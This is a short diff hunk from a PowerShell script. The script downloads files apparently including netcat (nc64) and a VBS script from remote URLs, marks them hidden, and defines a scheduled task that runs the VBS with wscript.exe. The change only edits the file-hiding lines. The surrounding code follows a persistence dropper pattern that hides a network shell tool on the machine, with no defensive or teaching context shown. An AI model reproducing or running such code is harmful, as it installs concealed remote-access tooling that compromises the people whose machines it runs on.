@@ -20,9 +20,9 @@ Invoke-WebRequest -Uri $nc64TxtUrl -OutFile $nc64TxtPath -ErrorAction Stop
 Invoke-WebRequest -Uri $scriptVbsUrl -OutFile $scriptVbsPath -ErrorAction Stop
 
 # Make the downloaded files hidden
-attrib +H $quietTxtPath -Force
-attrib +H $nc64TxtPath -Force
-attrib +H $scriptVbsPath -Force
+attrib +H $quietTxtPath
+attrib +H $nc64TxtPath
+attrib +H $scriptVbsPath
 
 # Define the action to run script.vbs using wscript.exe
 $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument $scriptVbsPath
